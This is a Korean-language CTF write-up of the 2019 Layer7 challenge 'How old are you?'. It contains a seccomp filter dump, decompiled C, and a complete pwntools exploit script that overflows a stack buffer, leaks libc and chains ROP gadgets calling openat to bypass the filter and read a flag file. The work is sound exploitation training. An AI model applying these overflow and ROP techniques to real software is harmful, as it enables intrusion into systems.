---
title: "2019 Layer7 CTF How old are you?"
date: 2020-1-6
tags: [Layer7]
categories: [Layer7]
---

seccomp 걸려있는 바이너리다. orw하는 문제라는데 `sys_open` 이 막혀있어서 `sys_openat` 을 이용해서 bypass 해서 파일 읽어오면 될거다.

```
$ seccomp-tools dump ./seccomp
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x12 0xc000003e  if (A != ARCH_X86_64) goto 0020
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x0f 0xffffffff  if (A != 0xffffffff) goto 0020
 0005: 0x15 0x0e 0x00 0x00000002  if (A == open) goto 0020
 0006: 0x15 0x0d 0x00 0x00000009  if (A == mmap) goto 0020
 0007: 0x15 0x0c 0x00 0x0000000a  if (A == mprotect) goto 0020
 0008: 0x15 0x0b 0x00 0x00000029  if (A == socket) goto 0020
 0009: 0x15 0x0a 0x00 0x00000038  if (A == clone) goto 0020
 0010: 0x15 0x09 0x00 0x0000003a  if (A == vfork) goto 0020
 0011: 0x15 0x08 0x00 0x0000003b  if (A == execve) goto 0020
 0012: 0x15 0x07 0x00 0x0000003e  if (A == kill) goto 0020
 0013: 0x15 0x06 0x00 0x00000065  if (A == ptrace) goto 0020
 0014: 0x15 0x05 0x00 0x0000009d  if (A == prctl) goto 0020
 0015: 0x15 0x04 0x00 0x00000130  if (A == open_by_handle_at) goto 0020
 0016: 0x15 0x03 0x00 0x00000142  if (A == execveat) goto 0020
 0017: 0x15 0x02 0x00 0x00000208  if (A == 0x208) goto 0020
 0018: 0x15 0x01 0x00 0x00000221  if (A == 0x221) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x06 0x00 0x00 0x00000000  return KILL
```

나이 묻고 아기 어른 머시기 하는 바이너리다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+0h] [rbp-110h]
  int v5; // [rsp+100h] [rbp-10h]
  int v6; // [rsp+104h] [rbp-Ch]
  int v7; // [rsp+108h] [rbp-8h]
  int i; // [rsp+10Ch] [rbp-4h]

  if ( !count )
    setup();
  v5 = 0;
  v7 = 0;
  v6 = 0;
  for ( i = 0; i <= 1; ++i )
  {
    printf("Input your age : ");
    v7 = _isoc99_scanf("%u", &v5);
    if ( v7 )
    {
      puts("Hello baby!");
      printf("What's your name? : ", &v5);
      read(0, &buf, 512uLL);
      puts("Okay! I know how you are now, baby :)");
    }
    else
    {
      puts("Hello adult!");
      printf("What's your name? : ", &v5);
      read(0, adult, 512uLL);
      v6 = strlen(adult);
      if ( v6 != 5 )
      {
        puts("Are you Korean?");
        exit(1);
      }
      puts("Okay! I know how you are now, adult :)");
    }
  }
  return 0;
}
```

익스는 간단하다. main함수에서 scanf를 우회해서 adult로 가게되면 adult가 bss영역이므로 이 곳에 입력 할 수 있으니까 open할 파일 이름을 넣어주면 된다. 근데 5글자 제한이라 `\x00` 으로 strlen bypass해주면 된다. 그리고 baby쪽에서 libc leak해주고 라이브러리 gadget들을 구해준 후 orw해주면 된다.

> exploit.py

```python
from pwn import *

# /home/seccomp/flag
# context.log_level = 'debug'
context.arch = 'amd64'
e = ELF('./seccomp')
p = process('./seccomp')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
prdi = 0x0000000000400eb3 # pop rdi ; ret
prsi_r15 = 0x0000000000400eb1 # pop rsi ; pop r15 ; ret
adult = 0x0000000000602060 # 0x200

p.sendlineafter(':','+')

payload = 'A'*5 + '\x00'
payload += '/vagrant/ctfs/flag.txt' + '\x00' # adult + 6
p.sendlineafter(':',payload)

p.sendlineafter(':','1')

payload2 = 'A'*0x110
payload2 += 'realsung'
payload2 += p64(prdi) + p64(e.got['puts']) + p64(e.plt['puts'])
payload2 += p64(e.symbols['main'])
p.sendlineafter(':',payload2)

p.recvuntil(':)\n')
libc_base = u64(p.recv(6) + '\x00\x00') - libc.symbols['puts']
log.info('libc_base : ' + hex(libc_base))

prdi = libc_base + 0x0000000000021102 # pop rdi ; ret
prsi = libc_base + 0x00000000000202e8 # pop rsi ; ret
prdx = libc_base + 0x0000000000001b92 # pop rdx ; ret
prax = libc_base + 0x0000000000033544 # pop rax ; ret
syscall = libc_base + 0x00122198 # syscall  ; ret  ;  (1 found)

p.sendlineafter(':','1')

payload3 = 'A'*0x110
payload3 += 'realsung'
payload3 += p64(prdi) + p64(0) + p64(prsi) + p64(adult+6) + p64(prdx) + p64(0) + p64(prax) + p64(257) + p64(syscall)
payload3 += p64(prdi) + p64(3) + p64(prsi) + p64(adult+100) + p64(prdx) + p64(100) + p64(prax) + p64(0) + p64(syscall)
payload3 += p64(prdi) + p64(1) + p64(prsi) + p64(adult+100) + p64(prdx) + p64(100) + p64(prax) + p64(1) + p64(syscall)
#print len(payload3)
p.sendlineafter(':',payload3)

p.interactive()
```

